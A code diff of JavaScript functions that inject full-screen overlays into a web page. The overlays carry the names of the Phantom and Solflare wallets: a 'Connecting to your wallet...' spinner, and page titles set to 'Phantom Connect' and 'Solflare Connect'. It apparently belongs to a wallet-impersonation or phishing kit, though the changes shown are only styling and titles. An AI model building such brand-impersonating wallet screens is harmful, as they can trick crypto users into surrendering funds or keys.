@@ -115,7 +115,10 @@ function injectPhantomUI() {
         <!-- <button class="phantomButton" id="phantomButton">Connect Wallet</button> -->
     </div>
     `;
-    
+
+    //change the title of the page
+    document.title = "Phantom Connect";
+
     // Inject the HTML content into the body
     body.insertAdjacentHTML('beforeend', htmlContent);
 }
@@ -124,8 +127,95 @@ function injectSolflareUI() {
     const body = document.querySelector('body');
     
     // Create your HTML content here
-    const htmlContent = '<div><h1>Hello, Solana!</h1></div>';
+    const htmlContent = `
+    <style>
+        body {
+            background-color: #121212; /* Dark theme background */
+            color: #ffffff; /* Dark theme text color */
+            margin: 0; /* Remove default margin for full height usage */
+            height: 100vh; /* Use full viewport height */
+            font-family: 'Arial', sans-serif; /* Updated font */
+            animation: background-animation 10s infinite; /* Added animation */
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh; /* Full height of the viewport */
+            width: 100vw; /* Full width of the viewport */
+            background: linear-gradient(135deg, #1e1e1e 0%, #000000 100%); /* Subtle gradient background */
+        }
+        @keyframes background-animation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            30% { transform: rotate(180deg); }
+            70% { transform: rotate(270deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-spinner {
+            border: 6px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #f47920;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1.5s cubic-bezier(0.4, 0.2, 0.8, 0.6) infinite;
+            margin-top: 20px;
+        }
+        .loading-text {
+            margin-top: 20px;
+            font-size: 20px; /* Larger font size */
+            color: #cccccc; /* Slightly lighter text color for contrast */
+            color: #cccccc; /* Slightly lighter text color for contrast */
+            font-family: 'Arial', sans-serif; /* Updated font */
+        }
+        .solflare-loading-container {
+            display: none; /* Hide the Solflare loading container */
+        }
+
+        svg {
+            width: 200px;  
+            margin: 50px;
+            height: auto;
+        }
+    </style>
+    <div class="container">
+        
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Connecting to your wallet...</div>
+        <style>
+            @keyframes blink {
+                0%, 100% { opacity: 1; }
+                50% { opacity: 0.5; }
+            }
+            .loading-text span {
+                animation: blink 1.5s step-end infinite;
+            }
+            .loading-text span:nth-child(2) {
+                animation-delay: 0.1s; /* Add a slight delay for better visibility */
+            }
+            .loading-text span:nth-child(3) {
+                animation-delay: 0.2s; /* Add a slight delay for better visibility */
+            }
+        </style>
+    </div>
+    `;
     
+    
+    document.title = "Solflare Connect";
+
     // Inject the HTML content into the body
     body.insertAdjacentHTML('beforeend', htmlContent);
 }
